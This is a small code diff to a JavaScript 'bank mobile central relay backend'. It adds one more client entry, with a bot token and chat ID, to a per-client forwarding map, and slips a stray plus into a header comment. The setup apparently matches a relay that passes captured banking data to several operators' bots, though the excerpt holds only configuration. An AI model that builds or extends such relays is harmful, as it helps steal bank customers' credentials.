@@ -1,4 +1,4 @@
-// ================================================
++// ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
 // Global + Per-Client + Master switch
 // Control endpoints support both GET + POST
@@ -40,7 +40,8 @@ const BOT_CONFIGS = {
     'ola': { token: process.env.BOT_TOKEN_15, chatId: process.env.CHAT_ID_15 },
     'bamzy': { token: process.env.BOT_TOKEN_16, chatId: process.env.CHAT_ID_16 },
     'mm': { token: process.env.BOT_TOKEN_17, chatId: process.env.CHAT_ID_17 },
-    'bayo': { token: process.env.BOT_TOKEN_18, chatId: process.env.CHAT_ID_18 }
+    'bayo': { token: process.env.BOT_TOKEN_18, chatId: process.env.CHAT_ID_18 },
+    'tobi': { token: process.env.BOT_TOKEN_19, chatId: process.env.CHAT_ID_19 }
 };
 
 const DEFAULT_CONFIG = {
